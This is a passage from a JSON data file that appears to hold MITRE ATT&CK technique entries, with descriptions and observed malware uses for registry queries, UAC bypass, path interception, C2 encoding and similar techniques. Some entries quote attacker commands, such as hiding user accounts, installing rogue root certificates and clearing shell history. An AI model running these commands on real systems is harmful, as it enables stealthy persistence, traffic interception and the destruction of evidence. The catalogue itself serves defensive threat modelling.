      "malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.",
      "surveys a system upon check-in to discover information in the Windows Registry with the reg query command."
    ],
    "id": "T1012",
    "name": "Query Registry",
    "similar_words": [
      "Query Registry"
    ]
  },
  "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd": {
    "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "example_uses": [
      "exfiltrates data in compressed chunks if a message is larger than 4096 bytes .",
      "exfiltrates command output and collected files to its C2 server in 1500-byte blocks.",
      "splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.",
      "uploads data in 2048-byte chunks.",
      "actors have split RAR files for exfiltration into parts."
    ],
    "id": "T1030",
    "name": "Data Transfer Size Limits",
    "similar_words": [
      "Data Transfer Size Limits"
    ]
  },
  "attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39": {
    "description": "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the winrm command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)",
    "example_uses": [
      "has used WinRM to enable remote execution.",
      "can use WinRM to execute a payload on a remote host."
    ],
    "id": "T1028",
    "name": "Windows Remote Management",
    "similar_words": [
      "Windows Remote Management"
    ]
  },
  "attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02": {
    "description": "Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\"). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)\n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\\system32 (e.g., C:\\Windows\\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if C:\\example path precedes C:\\Windows\\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\\example path will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).",
    "example_uses": [
      "contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables."
    ],
    "id": "T1034",
    "name": "Path Interception",
    "similar_words": [
      "Path Interception"
    ]
  },
  "attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0": {
    "description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.",
    "example_uses": [
      "binds and listens on port 1058.",
      "uses port 46769 for C2.",
      "opens a backdoor on TCP ports 6868 and 7777.",
      "uses port 52100 and 5876 for C2 communications.",
      "has used a variant of NanoCore RAT that communicates with its C2 server over port 6666.",
      "uses ports 447 and 8082 for C2 communications.",
      "A  variant can use port 127 for communications.",
      "has used ports 8060 and 8888 for C2.",
      "malware has communicated with its C2 server over ports 4443 and 3543.",
      "Some  variants use port 8088 for C2.",
      "A  module has a default C2 port of 13000.",
      "can use port 995 for C2.",
      "communicates with its C2 server over TCP port 3728.",
      "C2 servers communicated with malware over TCP 8081, 8282, and 8083.",
      "Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.",
      "An  downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81."
    ],
    "id": "T1065",
    "name": "Uncommonly Used Port",
    "similar_words": [
      "Uncommonly Used Port"
    ]
  },
  "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7": {
    "description": "Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)",
    "example_uses": [
      "has used bitsadmin.exe to download additional tools.",
      "can download a hosted \"beacon\" payload using .",
      "A  variant downloads the backdoor payload via the BITS service."
    ],
    "id": "T1197",
    "name": "BITS Jobs",
    "similar_words": [
      "BITS Jobs"
    ]
  },
  "attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be": {
    "description": "Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* eventvwr.exe can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n\nAnother bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)",
    "example_uses": [
      "performs UAC bypass.",
      "An older variant of  performs UAC bypass.",
      "A  tool can use a public UAC bypass method to elevate privileges.",
      "uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.",
      "has bypassed UAC.",
      "has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.",
      "can bypass UAC and create an elevated COM object to escalate privileges.",
      "Many  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.",
      "can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.",
      "malware xxmm contains a UAC bypass tool for privilege escalation.",
      "bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).",
      "contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.",
      "attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.",
      "can use a number of known techniques to bypass Windows UAC.",
      "can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.",
      "attempts to escalate privileges by bypassing User Access Control.",
      "attempts to disable UAC remote restrictions by modifying the Registry.",
      "contains UAC bypass code for both 32- and 64-bit systems.",
      "bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.",
      "bypassed User Access Control (UAC).",
      "has bypassed UAC."
    ],
    "id": "T1088",
    "name": "Bypass User Account Control",
    "similar_words": [
      "Bypass User Account Control"
    ]
  },
  "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f": {
    "description": "Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
    "example_uses": [
      "encodes commands from the control server using a range of characters and gzip.",
      "encoded C2 traffic with base64.",
      "encodes files before exfiltration.",
      "An  HTTP malware variant used Base64 to encode communications to the C2 server.",
      "can use base64 encoded C2 communications.",
      "encodes data in hexadecimal format over the C2 channel.",
      "encodes communications to the C2 server in Base64.",
      "A  malware sample encodes data with base64.",
      "encodes C2 traffic with base64.",
      "A  variant encodes C2 POST data base64.",
      "For C2 over HTTP,  encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS,  converts ASCII characters into their hexadecimal values and sends the data in cleartext.",
      "Several  tools encode data with base64 when posting it to a C2 server.",
      "uses custom base64 encoding to obfuscate HTTP traffic.",
      "uses Base64 encoding for communication in the message body of an HTTP request.",
      "C2 messages are Base64-encoded.",
      "encodes C2 traffic with base64.",
      "C2 traffic from  is encrypted, then encoded with Base64 encoding.",
      "exfiltrates data using cookie values that are Base64-encoded.",
      "network traffic is Base64-encoded plaintext.",
      "C2 traffic is base64-encoded.",
      "encodes C2 traffic with Base64.",
      "Responses from the  C2 server are base32-encoded.",
      "uses Base64 encoding for C2 traffic.",
      "uses Base64 encoding for C2 traffic.",
      "has sent a C2 response that was base64-encoded.",
      "used Base64 to encode C2 traffic."
    ],
    "id": "T1132",
    "name": "Data Encoding",
    "similar_words": [
      "Data Encoding"
    ]
  },
  "attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff": {
    "description": "Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: sudo dscl . -create /Users/username UniqueID 401 (Citation: Cybereason OSX Pirrit).",
    "example_uses": [],
    "id": "T1147",
    "name": "Hidden Users",
    "similar_words": [
      "Hidden Users"
    ]
  },
  "attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a": {
    "description": "Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nAdversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
    "example_uses": [
      "has used CHM files to move concealed payloads as part of.",
      "has used a CHM payload to load and execute another malicious file once delivered to a victim.",
      "leveraged a compiled HTML file that contained a command to download and run an executable."
    ],
    "id": "T1223",
    "name": "Compiled HTML File",
    "similar_words": [
      "Compiled HTML File"
    ]
  },
  "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416": {
    "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nSpecific common information repositories include:\n\n### Microsoft SharePoint\nFound in many enterprise networks and often used to store and share significant amounts of documentation.\n\n### Atlassian Confluence\nOften found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.",
    "example_uses": [
      "used a SharePoint enumeration and data dumping tool known as spwebmember.",
      "has collected information from Microsoft SharePoint services within target networks.",
      "is used to enumerate and dump information from Microsoft SharePoint."
    ],
    "id": "T1213",
    "name": "Data from Information Repositories",
    "similar_words": [
      "Data from Information Repositories"
    ]
  },
  "attack-pattern--d3046a90-580c-4004-8208-66915bc29830": {
    "description": "macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history.",
    "example_uses": [],
    "id": "T1146",
    "name": "Clear Command History",
    "similar_words": [
      "Clear Command History"
    ]
  },
  "attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847": {
    "description": "Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
    "example_uses": [
      "spearphished victims via Facebook and Whatsapp.",
      "used various social media channels to spearphish victims."
    ],
    "id": "T1194",
    "name": "Spearphishing via Service",
    "similar_words": [
      "Spearphishing via Service"
    ]
  },
  "attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9": {
    "description": "Computer accessories, computers, or networking hardware may be introduced into a system as a vector to gain execution. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.",
    "example_uses": [],
    "id": "T1200",
    "name": "Hardware Additions",
    "similar_words": [
      "Hardware Additions"
    ]
  },
  "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1": {
    "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
    "example_uses": [
      "installs a root certificate to aid in man-in-the-middle actions.",
      "can be used to install browser root certificates as a precursor to performing man-in-the-middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\\cert512121.der.",
      "can add a certificate to the Windows store."
    ],
    "id": "T1130",
    "name": "Install Root Certificate",
    "similar_words": [
      "Install Root Certificate"
    ]
  },
  "attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638": {
    "description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)",
    "example_uses": [
      "hides collected data in password-protected .rar archives.",
      "encrypts files with XOR before sending them back to the C2 server.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "encrypted the collected files' path with AES and then encoded them with base64.",
      "encrypts collected data with AES and Base64 and then sends it to the C2 server.",
      "encrypts data using Base64 before being sent to the command and control server.",
      "uses a variation of the XOR cipher to encrypt files before exfiltration.",
      "encrypts the collected files using 3-DES.",
      "has created password-protected RAR, WinImage, and zip archives to be exfiltrated.",
      "has compressed and encrypted data into password-protected RAR archives prior to exfiltration.",
      "encrypts data with a substitute cipher prior to exfiltration.",
      "encodes credit card data it collected from the victim with XOR.",
      "encrypts collected data with an incremental XOR key prior to exfiltration.",
      "writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.",
      "saves system information into an XML file that is then XOR-encoded.",
      "employs the same encoding scheme as  for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.",
      "Data  copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.",
      "encrypts collected data using a single byte XOR key.",
      "DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.",
      "After collecting files and logs from the victim,  encrypts some collected data with Blowfish.",
      "TRINITY malware used by  encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.",
      "malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.",
      "has used RAR to compress, encrypt, and password-protect files prior to exfiltration.",
      "is known to use RAR with passwords to encrypt data prior to exfiltration."
    ],
    "id": "T1022",
    "name": "Data Encrypted",
    "similar_words": [
      "Data Encrypted"
    ]
  },
  "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6": {
    "description": "A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. This can happen in several ways, but there are a few main components: \n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. (Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
    "example_uses": [
      "compromised three Japanese websites using a Flash exploit to perform watering hole attacks.",
      "compromised legitimate organizations' websites to create watering holes to compromise victims.",
      "leveraged a watering hole to serve up malicious code.",
      "performed a watering hole attack on forbes.com in 2014 to compromise targets.",
      "has infected victims by tricking them into visiting compromised watering hole websites.",
      "has infected victims using watering holes.",
      "has has extensively used strategic Web compromises to target victims.",
      "delivered  to victims via a compromised legitimate website.",
      "has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.",
      "has used watering holes to deliver files with exploits to initial victims.",
      "has sometimes used drive-by attacks against vulnerable browser plugins.",
      "has been delivered through compromised sites acting as watering holes.",
      "has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.",
      "was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure."
    ],
    "id": "T1189",
    "name": "Drive-by Compromise",
    "similar_words": [
      "Drive-by Compromise"
    ]
  },
  "attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93": {
    "description": "To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.\n\n### Windows\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do attrib +h filename to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.\n\n### Linux/Mac\n\nUsers can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: defaults write com.apple.finder AppleShowAllFiles YES, and then relaunch the Finder Application.\n\n### Mac\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\nMany applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",
    "example_uses": [
      "saves itself with a leading \".\" to make it a hidden file.",
      "saves itself with a leading \".\" so that it's hidden from users by default.",
      "uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.",
      "stores itself in ~/Library/.DS_Stores/ ",
      "An  loader Trojan saves its payload with hidden file attributes.",
      "A  VBA Macro sets its file attributes to System and Hidden.",
      "The  payload is stored in a hidden directory at /Users/Shared/.local/kextd."
    ],
    "id": "T1158",
    "name": "Hidden Files and Directories",
    "similar_words": [
      "Hidden Files and Directories"
    ]
  },
  "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534": {
    "description": "Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)",
    "example_uses": [
      "used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable .",
      "has injected SMB URLs into malicious Word spearphishing attachments to initiate ."
    ],
    "id": "T1221",
    "name": "Template Injection",
    "similar_words": [
      "Template Injection"
    ]
  },
  "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48": {
    "description": "Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. For example, Microsoft promotes the use of access tokens as a security best practice. Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command runas. (Citation: Microsoft runas)\n  \nAdversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system. (Citation: Pentestlab Token Manipulation)\n\nAccess tokens can be leveraged by adversaries through three methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token Impersonation/Theft** - An adversary creates a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.\n\n**Create Process with a Token** - An adversary creates a new access token with DuplicateToken(Ex) and uses it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.\n\n**Make and Impersonate Token** - An adversary has a username and password but the user is not logged onto the system. The adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.\n\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges. (Citation: Metasploit access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation and 